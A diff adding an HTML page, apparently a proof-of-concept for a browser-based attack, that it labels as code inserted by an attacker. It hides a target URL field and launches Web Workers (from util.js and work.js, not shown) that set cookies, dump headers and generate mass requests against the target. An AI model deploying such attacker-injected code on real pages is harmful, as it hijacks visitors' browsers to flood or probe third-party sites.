@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Audio/video request making</title>
+	<style type="text/css">
+	input {
+		margin: 10px;
+	}
+	#baseUrl {
+		width: 350px;
+		line-height: 20px;
+		font-size: 15px;
+		padding: 10px;
+		
+	}
+
+	#num-els {
+		margin-bottom: 30px;
+	}
+
+	.btn {
+		background: #3498db;
+		background-image: -webkit-linear-gradient(top, #3498db, #2980b9);
+		background-image: -moz-linear-gradient(top, #3498db, #2980b9);
+		background-image: -ms-linear-gradient(top, #3498db, #2980b9);
+		background-image: -o-linear-gradient(top, #3498db, #2980b9);
+		background-image: linear-gradient(to bottom, #3498db, #2980b9);
+		-webkit-border-radius: 28;
+		-moz-border-radius: 28;
+		border-radius: 28px;
+		color: #ffffff;
+		font-size: 24px;
+		padding: 10px 20px 10px 20px;
+		text-decoration: none;
+		margin-top: 30px;
+
+	}
+
+	.btn:hover {
+		background: #3cb0fd;
+		background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
+		background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
+		text-decoration: none;
+	}
+
+	</style>
+</head>
+<body>
+<center>
+	<h1 style="padding-bottom: 10px">This represents code inserted by the attacker</h1>
+	<form>
+		<div style="display: none;">
+			<input type="text" autocomplete="off" id="baseUrl" value="https://a.site.com"><br>
+			Number of WebWorkers to use: <input type="text" name="numworkers" id="num-els" value="4"><br>
+		</div>
+		<div>
+			<a href="#" id="setcookies" class="btn" alt="hello">Set Cookies</a>
+			<a href="#" id="start" class="btn">Start!</a>
+		</div style="padding-bottom: 10px">
+	</form>
+	<!-- <pre id="speed">Estimated requests/sec: 0</pre> -->
+	<div id="status" style="padding: 40px 0px 0px 0px"><img src="https://i.imgur.com/pBOeQzN.gif" /></div>
+</center>
+</body>
+<script type="text/javascript">
+var UTIL_JS = "util.js";
+var WORK_JS = "work.js"; // A minimal JS file solely to generate traffic increased the req/sec by +-1000 (!!!)
+var form = document.querySelector('form');
+
+document.getElementById('start').addEventListener('click', function(e) {
+	run();
+	e.preventDefault();
+	return false;
+});
+
+document.getElementById('setcookies').addEventListener('click', function(e) {
+	var baseDomains = document.getElementById('baseUrl').value.split(',');
+	for (var i = 0; i < baseDomains.length; ++i) {
+		var worker = new Worker(UTIL_JS);
+		worker.postMessage("INIT=" + baseDomains[i % baseDomains.length]);
+	}
+
+	var status = '<img src="https://i.imgur.com/pBOeQzN.gif" />'
+	updateStatus(status);
+	e.preventDefault();
+	return false;
+});
+
+function updateStatus(statusMsg) {
+	var div = document.getElementById("status");
+	div.innerHTML = statusMsg;
+}
+
+function run() {
+	var numworkers = parseInt(form.querySelector('input[name="numworkers"]').value, 10);
+	var baseDomains = document.getElementById('baseUrl').value.split(',');
+
+	// Dump the headers first
+	for (var i = 0; i < baseDomains.length; i++) {
+                var worker = new Worker(UTIL_JS);
+                worker.postMessage("DUMP=" + baseDomains[i % baseDomains.length]);
+        }
+
+	// Begin generating requests
+	updateStatus('<img src="https://i.imgur.com/xEgvEZ3.png" />');
+	for (var i = 0; i < numworkers; i++) {
+		var worker = new Worker(WORK_JS);
+		worker.postMessage(baseDomains[i % baseDomains.length]);
+	}
+}
+
+</script>
+</html>
